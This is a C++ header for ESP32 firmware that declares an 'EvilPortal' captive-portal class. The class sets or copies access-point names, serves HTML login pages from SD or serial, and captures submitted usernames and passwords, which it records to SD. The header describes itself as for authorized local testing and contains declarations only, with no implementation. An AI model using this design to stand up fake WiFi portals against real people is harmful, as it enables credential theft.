/** @file EvilPortal.h @brief Authorized local captive portal interface. */

#pragma once

#ifndef EvilPortal_h
#define EvilPortal_h

#include "ESPAsyncWebServer.h"
#include <AsyncTCP.h>
#include <DNSServer.h>
#include <deque>
#include <string>

#include "configs.h"
#include "settings.h"
#ifdef HAS_SCREEN
  #include "Display.h"
  #include <LinkedList.h>
#endif
#include "SDInterface.h"
#include "Buffer.h"
#include "lang_var.h"

extern Settings settings_obj;
extern SDInterface sd_obj;
#ifdef HAS_SCREEN
  extern Display display_obj;
#endif
extern Buffer buffer_obj; 

/** Captive-portal result states used by the legacy portal UI. */
#define WAITING 0
/** Captive-portal success state. */
#define GOOD 1
/** Captive-portal failure state. */
#define BAD 2

#define SET_HTML_CMD "sethtml="
#define SET_AP_CMD "setap="
#define RESET_CMD "reset"
#define START_CMD "start"
#define ACK_CMD "ack"
#define MAX_AP_NAME_SIZE 30 /**< Maximum AP name length including terminator budget. */
#define WIFI_SCAN_EVIL_PORTAL 30 /**< Scan mode value that enables portal processing. */

char apName[MAX_AP_NAME_SIZE] = "RedLilyGO-Portal";
char apPassword[64] = "";
char index_html[MAX_HTML_SIZE] = "TEST";

struct ssid {
  String essid; /**< Network name presented to the portal/AP setup. */
  uint8_t channel; /**< Radio channel associated with the network. */
  uint8_t bssid[6]; /**< Six-byte BSSID captured during scanning. */
  bool selected; /**< Whether the user selected this network. */
};

struct AccessPoint {
  String essid; /**< Access point name. */
  uint8_t channel; /**< Radio channel used by the access point. */
  uint8_t bssid[6]; /**< Six-byte BSSID. */
  bool selected; /**< Whether the access point is selected for the portal. */
  LinkedList<char>* beacon; /**< Captured beacon payload, when available. */
  int8_t rssi; /**< Received signal strength in dBm (signed). `char` is unsigned on ESP32, so it must be int8_t. */
  LinkedList<uint8_t>* stations; /**< Associated station identifiers, when captured. */
};

class CaptiveRequestHandler : public AsyncWebHandler {
public:
  /** Construct the wildcard handler used for captive-portal probes. */
  CaptiveRequestHandler() {}
  /** Release the stateless request handler. */
  virtual ~CaptiveRequestHandler() {}

  /** Accept all requests so unknown probe paths receive the portal page. */
  bool canHandle(AsyncWebServerRequest *request) { return true; }

  /** Serve the selected portal HTML from the global in-memory buffer. */
  void handleRequest(AsyncWebServerRequest *request);
};

class EvilPortal {

  private:
    struct SubmissionRecord {
      uint32_t timestamp;
      String page;
      String username;
      String password;
    };

    bool runServer = false;
    bool name_received = false;
    bool password_received = false;

    String user_name;
    String password;

    bool has_html = false;
    bool has_ap = false;
    bool explicit_ap = false;
    bool explicit_password = false;
    bool serverConfigured = false;
    bool portalStarted = false;

    DNSServer dnsServer;

    void (*resetFunction)(void) = 0;

    bool setHtml();
    bool setAP(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points);
    void setupServer();
    bool startPortal();
    bool startAP();
    void sendToDisplay(String msg);
    void loadSubmissionHistory();
    void recordSubmission();
    static std::string jsonEscape(const String &value);
    static bool isRootHtml(const String &path);
    static bool hasForm(const String &path);
    std::string submissionJson(const SubmissionRecord &record) const;
    std::deque<SubmissionRecord> submissionHistory;
    uint32_t submissionCount = 0;

  public:
    /** Reset portal state and discover available HTML files. */
    EvilPortal();

    String target_html_name = "index.html"; /**< SD HTML file selected for serving. */
    uint8_t selected_html_index = 0; /**< UI index of the selected HTML file. */

    bool using_serial_html = false; /**< Whether HTML was loaded from the serial stream. */

    LinkedList<String>* html_files = nullptr; /**< Discovered HTML files, owned by this object. */

    /** Return the most recently submitted username/email value. */
    String get_user_name();
    /** Return the most recently submitted password value. */
    String get_password();
    /** @brief Return portal state and recent local test submissions as JSON. */
    std::string getStatusJson() const;
    /** @brief Return root HTML files containing a form as JSON. */
    std::string getFormFilesJson() const;
    /** @brief Select a root HTML template after validating size and existence. */
    bool setTargetHtml(const String &filename);
    bool setPortalSsid(const String &ssid);
    /** Set the AP password (empty = open network, otherwise WPA2 8-63 chars). */
    bool setPortalPassword(const String &password);
    /** True when the current run overrides the saved portal settings. */
    bool hasExplicitAp() const { return explicit_ap; }
    bool hasExplicitPassword() const { return explicit_password; }
    void clearExplicitPortalOverrides() { explicit_ap = false; explicit_password = false; }
    String getPortalSsid() const;
    String getPortalIp() const;
    /** @brief Remove local submission history from SD. */
    bool clearSubmissionHistory();
    /** @brief Return whether captive portal server is active. */
    bool isActive() const { return portalStarted; }
    /** Initialize portal state and enumerate SD-backed HTML files. */
    bool setup();
    /** Configure AP and HTML sources, then start the portal. */
    bool begin(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points);
    /** Stop DNS, HTTP, and soft-AP services. */
    void stop();
    /** Process DNS requests and persist a completed credential submission. */
    void main(uint8_t scan_mode);
    /** Read portal HTML from serial for the bounded input window. */
    void setHtmlFromSerial();

};

#endif
